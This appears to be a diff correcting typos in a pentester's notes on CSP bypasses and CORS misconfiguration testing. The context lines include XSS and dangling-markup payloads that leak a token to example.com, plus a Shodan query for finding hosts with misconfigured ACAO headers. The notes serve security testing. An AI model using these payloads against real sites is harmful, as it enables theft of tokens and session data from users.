@@ -328,7 +328,7 @@ CSP for directive with random hash that tells to execute only if the script cont
 2. Inspect to console window and see the warning if something is not running
 3. Find hidden parameter that are suspectible to XSS like prefilled email
 4. check the following payload
-  - `<img src='https://example.com?` sometimes blocked by CSP `base-uri: self` meaining all images are loaded relative to this one
+  - `<img src='https://example.com?` sometimes blocked by CSP `base-uri: self` meaning all images are loaded relative to this one
   - `<base target="https://example.com?` sometimes is dangling markup which sends to https://example.com with `window.name` set to the payload which contains html component which includes token
   - `Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'`
     `<script>alert("This will be blocked")</script>`
@@ -352,7 +352,7 @@ https://www.cobalt.io/blog/csp-and-bypasses
 # CORS:
 
 Cross origin resource: It tells what resource to access depending upon the header and origin provided. 
-- Shodan can be used to check ACAO or other very easily. Query : `"Access-Control-Allow                      -Origin: null"`
+- Shodan can be used to check ACAO or other very easily. Query : `"Access-Control-Allow-Origin: null"`
 - URL 'Origin: http://example.com`.hackxor.net/'(safari) is parses as Origin: http://example.com or 'Origin: http://example.com_hackxor.net/' (firefox or chrome)
 - Do add `Origin` in header
 - Do subdomain check and domain suffix check
